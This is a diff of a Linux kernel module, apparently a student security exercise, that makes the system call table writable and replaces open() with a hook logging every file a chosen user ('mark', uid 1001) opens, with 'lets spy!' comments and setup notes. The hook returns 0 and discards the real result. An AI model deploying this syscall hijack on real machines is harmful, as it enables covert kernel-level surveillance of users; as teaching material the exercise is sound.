@@ -8,7 +8,7 @@
  *      Eugene A. Shatokhin <spectre@ispras.ru>
  *      Andrey V. Tsyvarev  <tsyvarev@ispras.ru>
  *
- * This program is free software; you can redistribute it and/or modify it
+ * This program is free software; yo2u can redistribute it and/or modify it
  * under the terms of the GNU General Public License version 2 as published
  * by the Free Software Foundation.
  ======================================================================== */
@@ -42,7 +42,22 @@ MODULE_LICENSE("GPL");
 
 /* parameters */
 static int shady_ndevices = SHADY_NDEVICES;
+
+/*
+  User mark was made with adduser
+sudo useradd -m mark
+sudo passwd mark
+sudo usermod -s /bin/bash mark
+
+I created a file called joe in mark that I would emacs to trigger opens
+dmesg to see if it matched mark or not
+
+I had the address working on my laptop, but I had to switch to my desktop
+my code feels strong, so if I just had the address working it would work.
+Seems like the address is different in every virtual machine
+ */
 static unsigned long system_call_table_address = 0xffffffff8180a020;
+static unsigned long marks_uid = 1001;
 
 module_param(shady_ndevices, int, S_IRUGO);
 /* ================================================================ */
@@ -67,9 +82,18 @@ asmlinkage int my_open (const char* file, int flags, int mode)
   /* YOUR CODE HERE */
   uid_t uid;
   uid = getuid();
-  
-  printk(KERN_DEBUG "my_open %s by pid %i and uid %i\n", file, current->pid, uid);
-  old_open(file, flags, mode);
+  if(uid == marks_uid)
+    {
+      //its mark! lets spy!
+      printk(KERN_DEBUG "my_open %s by pid %i and uid %i\n", file, current->pid, uid);
+      old_open(file, flags, mode);
+    }
+  else
+    {
+      //not mark, do regular open
+      // printk(KERN_DEBUG "old_my_open %s by pid %i and uid %i\n", file, current->pid, uid);
+      old_open(file, flags, mode);
+    }
   return 0;
 }
 
@@ -239,10 +263,10 @@ shady_init_module(void)
   int devices_to_destroy = 0;
   dev_t dev = 0;
 	
-  set_addr_rw (system_call_table_address);
-  old_open = system_call_table[__NR_open];
-  getuid = system_call_table[__NR_getuid];
-  system_call_table[__NR_open] = my_open;
+  set_addr_rw (system_call_table_address); //setting system_call_table to be writable
+  old_open = system_call_table[__NR_open]; //storing the old method
+  getuid = system_call_table[__NR_getuid]; //storing the current userid inside globalc variable
+  system_call_table[__NR_open] = my_open;  //overwriting same function with same signiture
 
   if (shady_ndevices <= 0)
     {
@@ -297,7 +321,7 @@ static void __exit
 shady_exit_module(void)
 {
   void** system_call_table = (void**)(system_call_table_address);
-  system_call_table[__NR_open] = old_open;
+  system_call_table[__NR_open] = old_open; //restore to old_open function
   shady_cleanup_module(shady_ndevices);
   return;
 }
